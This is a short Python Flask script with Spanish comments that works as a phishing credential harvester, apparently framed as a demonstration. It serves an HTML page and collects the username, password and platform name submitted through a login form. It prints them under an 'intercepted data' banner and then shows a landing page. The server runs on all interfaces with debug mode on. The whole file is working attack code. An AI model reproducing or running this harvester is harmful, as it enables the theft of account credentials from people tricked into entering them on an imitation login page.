from flask import Flask, request

app = Flask(__name__)

# Cargamos archivos directamente, sin carpetas especiales
@app.route('/')
def inicio():
    with open('index.html', encoding='utf-8') as f:
        return f.read()

@app.route('/enviar-datos', methods=['POST'])
def recibir():
    usuario = request.form.get('usuario', 'NO RECIBIDO')
    clave = request.form.get('clave', 'NO RECIBIDO')
    proveedor = request.form.get('proveedor', 'NO RECIBIDO')

    # Banner claro en consola para tu demostración
    print("\n" + "="*50)
    print("       🔴 DATOS INTERCEPTADOS 🔴")
    print("="*50)
    print(f" Plataforma: {proveedor}")
    print(f" Usuario:    {usuario}")
    print(f" Contraseña: {clave}")
    print("="*50 + "\n")

    # Página de aterrizaje (si querés mantener el nombre que usabas, cambialo)
    with open('aterrizaje.html', encoding='utf-8') as f:
        return f.read()

if __name__ == '__main__':
    print("\n[!] Servidor iniciado en http://0.0.0.0:5000")
    print("[!] Presiona Ctrl+C para detener\n")
    app.run(host='0.0.0.0', port=5000, debug=True)
